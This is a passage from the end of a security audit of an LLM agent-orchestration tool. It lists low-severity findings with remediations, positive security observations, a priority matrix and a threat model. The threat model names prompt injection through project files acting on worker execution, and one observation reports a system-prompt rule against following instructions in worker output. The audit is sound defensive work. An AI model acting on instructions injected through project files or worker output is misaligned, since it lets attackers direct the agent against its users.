    cmd.append(safe_task)
    return cmd
```

---

### SA-18: Dummy API Keys in Default Settings
**Severity:** LOW
**CWE:** CWE-1188 (Insecure Default Initialization of Resource)
**CVSS 3.1:** 2.0 (Low)

**Location:** `src/core/config.py` lines 168, 229

**Description:**
```python
ORCHESTRATOR_API_KEY: str = Field(default="sk-dummy-orchestrator-key", ...)
PROXY_KEY: str = Field(default="sk-dummy-proxy-key", ...)
```
Default dummy keys are set in the settings class. While the `validate_config()` method warns about dummy keys, the application will still attempt to use them for API calls, potentially triggering rate limiting or account lockouts on provider endpoints that track failed authentication attempts.

**Remediation:** Require API keys to be explicitly set before allowing LLM calls, or fail fast with a clear error message.

---

### SA-19: Unpinned Dependency Versions
**Severity:** LOW
**CWE:** CWE-1104 (Use of Unmaintained Third Party Components)
**CVSS 3.1:** 2.0 (Low)

**Location:** `pyproject.toml` lines 7-23

**Description:**
Several dependencies use minimum version constraints (`>=`) instead of pinned versions or upper bounds:
```toml
"pyyaml",           # No version constraint at all
"requests",         # No version constraint
"jinja2",           # No version constraint
"tenacity",         # No version constraint
```
This means `uv lock` or `pip install` could pull in a future version with breaking changes or known CVEs.

**Remediation:** Add a `uv.lock` file to the repository, and consider adding upper bounds:
```toml
"pyyaml>=6.0,<7.0",
"requests>=2.31.0,<3.0",
"jinja2>=3.1.0,<4.0",
```

---

### SA-20: Full Filesystem Paths Exposed in Error Messages
**Severity:** LOW
**CWE:** CWE-209 (Generation of Error Message Containing Sensitive Information)
**CVSS 3.1:** 2.0 (Low)

**Location:** Multiple locations including:
- `src/core/worker.py` line 195: `f"Agent path does not exist: {agent_path}"`
- `src/core/config.py` line 381: `f"AGENT_PATH does not exist: {agent_path}"`

**Description:** Full filesystem paths (e.g., `C:\Users\Orhan\Documents\Github\...`) are exposed in error messages displayed to the user. This leaks information about the deployment environment, username, and directory structure.

**Remediation:** Use relative paths in user-facing messages.

---

### SA-21: `lru_cache` on Settings Prevents Environment Reloading
**Severity:** LOW
**CWE:** CWE-1176 (Inefficient CPU Computation)
**CVSS 3.1:** 2.0 (Low)

**Location:** `src/core/config.py` lines 424-427

**Description:**
```python
@lru_cache
def get_settings() -> Settings:
    return Settings()
```
The `lru_cache` without `maxsize` parameter means the settings singleton is cached indefinitely. While `reload_settings()` exists to clear the cache, any code path that calls `get_settings()` without going through `reload_settings()` will get stale settings. This could cause security-relevant settings changes (like API key rotation) to not take effect.

**Remediation:** This is by design for performance, but document clearly that `reload_settings()` must be called after any `.env` changes.

---

### SA-22: No Length Limits on User Message Content
**Severity:** LOW
**CWE:** CWE-770 (Allocation of Resources Without Limits or Throttling)
**CVSS 3.1:** 2.0 (Low)

**Location:** `src/core/manager.py` line 942

**Description:**
```python
def chat(self, user_message: str) -> ManagerResponse:
    self.messages.append(Message(role=MessageRole.USER, content=user_message))
```
No length validation is performed on user messages. Extremely long messages could cause excessive memory consumption, large API request payloads (and associated costs), and bloated session files. The conversation history grows unbounded.

**Remediation:**
```python
MAX_USER_MESSAGE_LENGTH = 100_000  # 100KB

def chat(self, user_message: str) -> ManagerResponse:
    if len(user_message) > MAX_USER_MESSAGE_LENGTH:
        return ManagerResponse(
            content=f"Message too long ({len(user_message)} chars). Maximum is {MAX_USER_MESSAGE_LENGTH}.",
        )
    self.messages.append(Message(role=MessageRole.USER, content=user_message))
```

---

## Positive Security Observations

The audit also identified several security-positive design decisions worth recognizing:

1. **Environment variable allowlisting** (`worker.py` lines 115-120): The worker subprocess receives only a curated set of environment variables, preventing accidental credential leakage from the parent process to subprocess. This is a strong defense-in-depth measure.

2. **`yaml.safe_load()` used consistently** (`config.py` lines 51, 85, 293, 350): All YAML parsing uses the safe loader, preventing YAML deserialization attacks.

3. **`write_env_value()` allowlist** (`config.py` lines 446-453): Only a fixed set of known keys can be written to `.env`, preventing arbitrary configuration injection.

4. **Name sanitization with `SANITIZE_RE`** (`config.py` line 20): A centralized regex pattern `[^a-zA-Z0-9_-]` is used consistently across all registries to sanitize names. This prevents most injection attacks through worker/sub-manager names.

5. **`.env` in `.gitignore`** (`.gitignore` line 30): Secrets files are excluded from version control.

6. **Subprocess uses list arguments, not shell=True** (`worker.py` line 201): The subprocess is spawned with argument list, preventing shell injection.

7. **Partial API key display** (`handlers.py` line 179): The command handler displays only the last 4 characters of API keys (`****...{key[-4:]}`).

8. **LLM prompt injection awareness** (`manager.py` lines 123-127): The system prompt explicitly warns the Manager LLM not to follow instructions from worker output, addressing indirect prompt injection.

9. **Graceful subprocess termination** (`worker.py` lines 148-161): Worker processes are terminated gracefully with a fallback to force kill, preventing orphaned processes.

10. **Newline stripping in `write_env_value`** (`config.py` line 454): The function strips `\n` and `\r` from values before writing, preventing `.env` injection via newline characters.

---

## Remediation Priority Matrix

| Priority | Findings | Effort | Impact |
|----------|----------|--------|--------|
| **P0 - Immediate** | SA-02 (hash corruption), SA-03 (path traversal) | Low | Prevents data corruption and arbitrary file reads |
| **P1 - This Sprint** | SA-01 (plaintext keys), SA-04 (keys in sessions), SA-05 (tmp perms) | Medium | Protects credentials at rest |
| **P2 - Next Sprint** | SA-06 (setattr), SA-07 (provider detection), SA-08 (error leaks), SA-09 (SSRF) | Medium | Closes credential exposure vectors |
| **P3 - Backlog** | SA-10 through SA-17 | Low-Medium | Hardens secondary attack surfaces |
| **P4 - Monitor** | SA-18 through SA-22 | Low | Quality and defense-in-depth improvements |

---

## Appendix A: Threat Model Summary

| Threat Actor | Access Level | Primary Targets | Relevant Findings |
|---|---|---|---|
| Local user (shared system) | File system read | `.env`, registry JSONs, session files | SA-01, SA-04, SA-05 |
| Crafted file attacker | Write to `.gorchestrator/` | Registry files, session files | SA-03, SA-06, SA-10 |
| Prompt injection via project files | Indirect (through LLM) | Task content, worker execution | SA-17, SA-09 |
| Compromised dependency | Package install | `sys.path`, subprocess env | SA-12, SA-16, SA-19 |

---

*End of Security Audit Report*
